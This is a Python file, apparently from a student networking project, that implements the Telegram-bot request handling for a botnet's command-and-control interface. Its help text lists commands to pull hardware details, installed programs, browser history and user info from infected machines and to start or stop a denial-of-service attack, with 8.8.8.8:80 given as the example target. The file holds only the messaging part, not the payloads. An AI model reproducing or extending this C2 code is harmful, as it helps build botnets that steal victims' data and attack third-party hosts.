#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# ifrn/2023.2/programacao_para_redes/projeto/requisicoes.py
# Copyright (C) 2023-2024  Sidney Pedro
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

# Importando bibliotecas
from constantes import *
import funcoes, requests, time

# Função para salvar a última atualização
def salvar_update_id(update_id: int):
    arquivo = open(f"{funcoes.DIRETORIO_ATUAL}/update_id.txt", "w")
    arquivo.write(f"{update_id}\n")
    arquivo.close()

    return

# Função para obter última atualização e mensagem
def obter_atualizacoes(latest_update_id: int):
    # Realizando requisição à API e, em caso de erro, retorna-se a
    # atualização anterior
    latest_message = None
    updates = requests.get(f"{TELEGRAM_API}/getUpdates?offset={latest_update_id}")
    retorno = updates.json()
    if (updates.status_code == 409):
        print("Erro: outra conexão está sendo estabelecida ao bot!")
        return latest_update_id, latest_message
    elif (updates.status_code != 200):
        return latest_update_id, latest_message
    elif (len(retorno["result"]) == 0):
        return latest_update_id, latest_message

    # Abrindo arquivo de atualização e, em caso de exceção, recria-se
    # e abre-se o mesmo
    try:
        arquivo = open(f"{funcoes.DIRETORIO_ATUAL}/update_id.txt", "r")
    except:
        salvar_update_id(latest_update_id)
        arquivo = open(f"{funcoes.DIRETORIO_ATUAL}/update_id.txt", "r")

    # Lendo arquivo de atualização
    latest_update_id = arquivo.readline()
    arquivo.close()

    # Obtendo última atualização salva e, em caso de exceção,
    # remove-se o aquivo de atualização e retorna-se a atualização
    # anterior
    try:
        latest_update_id = int(latest_update_id)
    except:
        funcoes.remover_arquivo("update_id.txt")
        return latest_update_id, latest_message

    # Lendo última atualização e, se ela não for maior que a última
    # atualização salva, retorna-se a atualização anterior
    message_id = retorno["result"][-1]["update_id"]
    if (not message_id > latest_update_id):
        return latest_update_id, latest_message

    # Atualizando última atualização e mensagem
    latest_update_id = message_id
    latest_message = retorno["result"][-1]
    return latest_update_id, latest_message

# Função para responder mensagem
def responder_mensagem(retorno: dict):
    mensagem = retorno["text"]

    if (mensagem == ''):
        retorno["text"] = f"""Comando desconhecido ou incorreto!

Digite `./c2 -h` para obter a lista de comandos válidos"""
    elif (mensagem == "./c2 -h"):
        retorno["text"] = f"""Uso: `./c2 [OPÇÃO] [ARGUMENTO]...`
Comando e Controle (C2) da _botnet_ do Projeto de ProgRedes 2023.2

Opções:
` -h           ` Exibir ajuda (comandos disponíveis, exemplos
`              ` de uso, etc.)
` -q ID        ` Finaliza o daemon do servidor ou de uma
`              ` máquina conectada identificada por `ID` (o ID do
`              ` servidor é `0`)
` -d ID        ` Lista informações de hardware de uma máquina
`              ` conectada identificada por `ID`
` -p ID        ` Lista programas instalados em uma máquina
`              ` conectada identificada por `ID` (essa ação pode
`              ` levar alguns minutos até ser concluída)
` -b ID        ` Obtém os últimos 200 itens do histórico de 
`              ` navegação dos navegadores de uma máquina
`              ` conectada identificada por `ID`
` -u ID        ` Obtém informações do usuário logado de uma
`              ` máquina conectada identificada por `ID`
` -l           ` Lista de máquinas conectadas (ID's, endereços,
`              ` IP, tempo online, etc.)
` -n AÇÃO SOCK ` Realiza Negação de Serviço (leia os exemplos de
`              ` uso abaixo). Valores válidos para `AÇÃO` são
`              ` `iniciar` e `parar`. O argumento `SOCK` deve
`              ` seguir o formato `IP:PORTA`

Exemplos:
` ./c2 -h                    ` Solicitando instruções de uso
`                            ` do C2
` ./c2 -q 0                  ` Finaliza o servidor
` ./c2 -q 4                  ` Finaliza o cliente `4`
` ./c2 -b 1                  ` Obtendo os últimos 200 itens
`                            ` do histórico de navegação do
`                            ` cliente `1`
` ./c2 -n iniciar 8.8.8.8:80 ` Iniciando Negação de Serviço
`                            ` contra a porta `80` da máquina
`                            ` `8.8.8.8`
` ./c2 -n parar 8.8.8.8:80   ` Parando Negação de Serviço
`                            ` contra a porta `80` da máquina
`                            ` `8.8.8.8`"""

    if (len(mensagem) < 2048):
        requests.post(f"{TELEGRAM_API}/sendMessage", data=retorno)
        return

    while (len(mensagem) > 0):
        retorno["text"] = f"```text\n{mensagem[:2048]}```"
        requests.post(f"{TELEGRAM_API}/sendMessage", data=retorno)
        mensagem = mensagem[2048:]
        try:
            time.sleep(3)
        except:
            break

    return
